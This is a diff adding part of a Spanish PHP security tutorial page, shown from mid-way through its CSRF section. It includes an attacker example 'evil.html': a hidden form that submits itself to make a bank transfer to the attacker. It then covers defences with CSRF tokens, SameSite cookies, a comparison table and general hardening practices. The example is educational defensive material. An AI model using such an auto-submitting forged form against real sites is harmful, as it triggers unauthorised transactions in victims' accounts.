+        </div>
+        <div class="code-wrap">
+          <div class="code-label"><span><span class="code-dot dot-r"></span><span class="code-dot dot-y"></span><span class="code-dot dot-g"></span></span><span>evil.html — código del atacante</span><button class="copy-btn" onclick="copiar(this)">Copiar</button></div>
+          <pre><span class="cmt">&lt;!-- Formulario invisible que se autoenvía --&gt;</span>
+<span class="tag">&lt;form</span> <span class="atr">action</span>=<span class="str">"https://banco.com/transferir"</span> <span class="atr">method</span>=<span class="str">"POST"</span> <span class="atr">id</span>=<span class="str">"f"</span><span class="tag">&gt;</span>
+  <span class="tag">&lt;input</span> <span class="atr">name</span>=<span class="str">"monto"</span>     <span class="atr">value</span>=<span class="str">"5000"</span>       <span class="atr">type</span>=<span class="str">"hidden"</span><span class="tag">&gt;</span>
+  <span class="tag">&lt;input</span> <span class="atr">name</span>=<span class="str">"destinatario"</span> <span class="atr">value</span>=<span class="str">"atacante"</span>  <span class="atr">type</span>=<span class="str">"hidden"</span><span class="tag">&gt;</span>
+<span class="tag">&lt;/form&gt;</span>
+<span class="tag">&lt;script&gt;</span>document.getElementById('f').submit();<span class="tag">&lt;/script&gt;</span></pre>
+        </div>
+      </div>
+
+      <div id="csrf-token" class="tab-content">
+        <div class="code-wrap">
+          <div class="code-label"><span><span class="code-dot dot-r"></span><span class="code-dot dot-y"></span><span class="code-dot dot-g"></span></span><span>csrf_token.php</span><button class="copy-btn" onclick="copiar(this)">Copiar</button></div>
+          <pre><span class="tag">&lt;?php</span>
+<span class="fn">session_start</span>()<span class="op">;</span>
+
+<span class="cmt">// Generar token único por sesión</span>
+<span class="kw">function</span> <span class="fn">csrfToken</span>(): <span class="kw">string</span> {
+    <span class="kw">if</span> (<span class="fn">empty</span>(<span class="var">$_SESSION</span>[<span class="str">'csrf'</span>])) {
+        <span class="var">$_SESSION</span>[<span class="str">'csrf'</span>] <span class="op">=</span> <span class="fn">bin2hex</span>(<span class="fn">random_bytes</span>(<span class="num">32</span>))<span class="op">;</span>
+    }
+    <span class="kw">return</span> <span class="var">$_SESSION</span>[<span class="str">'csrf'</span>]<span class="op">;</span>
+}
+
+<span class="cmt">// Verificar token — usar hash_equals (timing-safe)</span>
+<span class="kw">function</span> <span class="fn">verificarCsrf</span>(): <span class="kw">void</span> {
+    <span class="var">$tokenSesion</span> <span class="op">=</span> <span class="var">$_SESSION</span>[<span class="str">'csrf'</span>] <span class="op">??</span> <span class="str">''</span><span class="op">;</span>
+    <span class="var">$tokenPost</span>   <span class="op">=</span> <span class="var">$_POST</span>[<span class="str">'_token'</span>]  <span class="op">??</span> <span class="str">''</span><span class="op">;</span>
+    <span class="kw">if</span> (<span class="op">!</span><span class="fn">hash_equals</span>(<span class="var">$tokenSesion</span><span class="op">,</span> <span class="var">$tokenPost</span>)) {
+        <span class="fn">http_response_code</span>(<span class="num">403</span>)<span class="op">;</span>
+        <span class="fn">die</span>(<span class="str">"❌ Petición no válida (CSRF)"</span>)<span class="op">;</span>
+    }
+}
+
+<span class="cmt">// En el controlador POST</span>
+<span class="kw">if</span> (<span class="var">$_SERVER</span>[<span class="str">'REQUEST_METHOD'</span>] <span class="op">===</span> <span class="str">'POST'</span>) {
+    <span class="fn">verificarCsrf</span>()<span class="op">;</span>  <span class="cmt">// verificar ANTES de procesar</span>
+    <span class="cmt">// ... procesar la acción</span>
+}
+<span class="tag">?&gt;</span>
+
+<span class="cmt">&lt;!-- En el formulario HTML --&gt;</span>
+<span class="tag">&lt;form</span> <span class="atr">method</span>=<span class="str">"POST"</span> <span class="atr">action</span>=<span class="str">"/transferir"</span><span class="tag">&gt;</span>
+  <span class="tag">&lt;input</span> <span class="atr">type</span>=<span class="str">"hidden"</span> <span class="atr">name</span>=<span class="str">"_token"</span> <span class="atr">value</span>=<span class="str">"&lt;?= csrfToken() ?&gt;"</span><span class="tag">&gt;</span>
+  <span class="tag">&lt;input</span> <span class="atr">type</span>=<span class="str">"number"</span> <span class="atr">name</span>=<span class="str">"monto"</span><span class="tag">&gt;</span>
+  <span class="tag">&lt;button&gt;</span>Transferir<span class="tag">&lt;/button&gt;</span>
+<span class="tag">&lt;/form&gt;</span></pre>
+        </div>
+        <div class="visual-box">
+          <div class="visual-label">▶ Por qué funciona</div>
+          <div class="output-success">El token es secreto y único por sesión</div>
+          <div class="output-success">evil.com no puede leer el token (política same-origin)</div>
+          <div class="output-success">Sin el token correcto → petición rechazada</div>
+        </div>
+      </div>
+
+      <div id="csrf-extra" class="tab-content">
+        <div class="code-wrap">
+          <div class="code-label"><span><span class="code-dot dot-r"></span><span class="code-dot dot-y"></span><span class="code-dot dot-g"></span></span><span>samesite_cookies.php</span><button class="copy-btn" onclick="copiar(this)">Copiar</button></div>
+          <pre><span class="tag">&lt;?php</span>
+<span class="cmt">// SameSite=Strict — la cookie NO se envía en peticiones cross-site</span>
+<span class="cmt">// Es la defensa más efectiva contra CSRF</span>
+<span class="fn">session_set_cookie_params</span>([
+    <span class="str">'lifetime'</span> <span class="op">=&gt;</span> <span class="num">0</span><span class="op">,</span>
+    <span class="str">'path'</span>     <span class="op">=&gt;</span> <span class="str">'/'</span><span class="op">,</span>
+    <span class="str">'domain'</span>   <span class="op">=&gt;</span> <span class="str">''</span><span class="op">,</span>
+    <span class="str">'secure'</span>   <span class="op">=&gt;</span> <span class="kw">true</span><span class="op">,</span>    <span class="cmt">// solo HTTPS</span>
+    <span class="str">'httponly'</span> <span class="op">=&gt;</span> <span class="kw">true</span><span class="op">,</span>    <span class="cmt">// JS no puede acceder</span>
+    <span class="str">'samesite'</span> <span class="op">=&gt;</span> <span class="str">'Strict'</span> <span class="cmt">// no se envía en cross-site</span>
+])<span class="op">;</span>
+<span class="fn">session_start</span>()<span class="op">;</span>
+
+<span class="cmt">// SameSite valores:</span>
+<span class="cmt">// Strict → nunca en cross-site (máxima protección, puede romper flujos OAuth)</span>
+<span class="cmt">// Lax    → no en POST cross-site, sí en GET navegación normal</span>
+<span class="cmt">// None   → siempre (requiere Secure=true)</span>
+<span class="tag">?&gt;</span></pre>
+        </div>
+        <table class="data-table" style="margin-top:1rem">
+          <tr><th>Defensa</th><th>Protección</th><th>Nivel</th></tr>
+          <tr><td>Token CSRF</td><td>Verifica que la petición viene de tu propio formulario</td><td>🟢 Alto</td></tr>
+          <tr><td>SameSite=Strict</td><td>El navegador no envía cookies en peticiones cross-site</td><td>🟢🟢 Muy alto</td></tr>
+          <tr><td>Verificar Origin/Referer</td><td>Comprobar cabecera HTTP de origen de la petición</td><td>🟡 Medio</td></tr>
+          <tr><td>Doble submit cookie</td><td>Token en cookie + formulario, comparar ambos</td><td>🟢 Alto</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- HEADERS Y EXTRA -->
+  <div class="concept-card">
+    <div class="concept-header">
+      <div class="concept-num" style="background:linear-gradient(135deg,#06d6a0,#0096c7)">5</div>
+      <div>
+        <div class="concept-title">Buenas prácticas generales de seguridad</div>
+        <div class="concept-desc">Validación de entrada · headers HTTP · HTTPS · datos sensibles · principio de mínimo privilegio.</div>
+      </div>
+    </div>
+    <div class="concept-body">
+      <div class="code-wrap">
+        <div class="code-label"><span><span class="code-dot dot-r"></span><span class="code-dot dot-y"></span><span class="code-dot dot-g"></span></span><span>seguridad_general.php</span><button class="copy-btn" onclick="copiar(this)">Copiar</button></div>
+        <pre><span class="tag">&lt;?php</span>
+<span class="cmt">// ── 1. NUNCA confíes en datos del usuario ──────────────────</span>
+<span class="cmt">// Valida + Sanitiza + Escapa — en ese orden</span>
+<span class="var">$edad</span> <span class="op">=</span> <span class="fn">filter_input</span>(<span class="kw">INPUT_POST</span><span class="op">,</span> <span class="str">'edad'</span><span class="op">,</span> <span class="kw">FILTER_VALIDATE_INT</span><span class="op">,</span>
+    [<span class="str">'options'</span> <span class="op">=&gt;</span> [<span class="str">'min_range'</span> <span class="op">=&gt;</span> <span class="num">0</span><span class="op">,</span> <span class="str">'max_range'</span> <span class="op">=&gt;</span> <span class="num">120</span>]]
+)<span class="op">;</span>
+
+<span class="cmt">// ── 2. Ocultar información del servidor ────────────────────</span>
+<span class="fn">header_remove</span>(<span class="str">'X-Powered-By'</span>)<span class="op">;</span>           <span class="cmt">// quita "PHP/8.x"</span>
+<span class="fn">ini_set</span>(<span class="str">'expose_php'</span><span class="op">,</span> <span class="str">'Off'</span>)<span class="op">;</span>            <span class="cmt">// en php.ini también</span>
+
+<span class="cmt">// ── 3. Regenerar ID de sesión tras login ───────────────────</span>
+<span class="kw">if</span> (<span class="var">$loginExitoso</span>) {
+    <span class="fn">session_regenerate_id</span>(<span class="kw">true</span>)<span class="op">;</span>         <span class="cmt">// previene session fixation</span>
+    <span class="var">$_SESSION</span>[<span class="str">'usuario_id'</span>] <span class="op">=</span> <span class="var">$usuario</span>[<span class="str">'id'</span>]<span class="op">;</span>
+}
+
+<span class="cmt">// ── 4. Variables de entorno para datos sensibles ───────────</span>
+<span class="var">$dbPass</span>    <span class="op">=</span> <span class="fn">getenv</span>(<span class="str">'DB_PASSWORD'</span>)<span class="op">;</span>      <span class="cmt">// desde .env</span>
+<span class="var">$apiKey</span>    <span class="op">=</span> <span class="fn">getenv</span>(<span class="str">'STRIPE_SECRET'</span>)<span class="op">;</span>
+<span class="cmt">// NUNCA en el código ni en Git</span>
+
+<span class="cmt">// ── 5. Control de velocidad — limitar intentos de login ────</span>
+<span class="kw">function</span> <span class="fn">verificarRateLimit</span>(<span class="kw">string</span> <span class="var">$ip</span>): <span class="kw">void</span> {
+    <span class="var">$key</span>      <span class="op">=</span> <span class="str">"login_intentos_<span class="var">$ip</span>"</span><span class="op">;</span>
+    <span class="var">$intentos</span> <span class="op">=</span> <span class="var">$_SESSION</span>[<span class="var">$key</span>] <span class="op">??</span> <span class="num">0</span><span class="op">;</span>
+    <span class="kw">if</span> (<span class="var">$intentos</span> <span class="op">&gt;=</span> <span class="num">5</span>) {
+        <span class="fn">http_response_code</span>(<span class="num">429</span>)<span class="op">;</span>
+        <span class="fn">die</span>(<span class="str">"Demasiados intentos. Espera 15 minutos."</span>)<span class="op">;</span>
+    }
+    <span class="var">$_SESSION</span>[<span class="var">$key</span>] <span class="op">=</span> <span class="var">$intentos</span> <span class="op">+</span> <span class="num">1</span><span class="op">;</span>
+}
+
+<span class="cmt">// ── 6. Tiempo de respuesta constante — evitar timing attacks</span>
+<span class="cmt">// Usar hash_equals() para comparar tokens/hashes</span>
+<span class="cmt">// Usar password_verify() para contraseñas (ya es timing-safe)</span>
+<span class="fn">hash_equals</span>(<span class="var">$tokenBD</span><span class="op">,</span> <span class="var">$tokenUsuario</span>)<span class="op">;</span>  <span class="cmt">// ✅ timing-safe</span>
+<span class="var">$tokenBD</span> <span class="op">===</span> <span class="var">$tokenUsuario</span><span class="op">;</span>            <span class="cmt">// ❌ NO timing-safe</span>
+<span class="tag">?&gt;</span></pre>
+      </div>
+      <div class="visual-box">
+        <div class="visual-label">▶ Checklist de seguridad PHP</div>
+        <div class="output-success">✅ Usar sentencias preparadas (nunca concatenar SQL)</div>
+        <div class="output-success">✅ htmlspecialchars() en toda salida HTML</div>
+        <div class="output-success">✅ password_hash() / password_verify() para contraseñas</div>
+        <div class="output-success">✅ Token CSRF en todos los formularios POST</div>
+        <div class="output-success">✅ Cookies HttpOnly + Secure + SameSite=Strict</div>
+        <div class="output-success">✅ session_regenerate_id() tras login</div>
+        <div class="output-success">✅ Datos sensibles en variables de entorno</div>
+        <div class="output-success">✅ Headers de seguridad HTTP</div>
+        <div class="output-success">✅ Mostrar errores genéricos al usuario, detalles solo en logs</div>
+      </div>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- REGEX -->
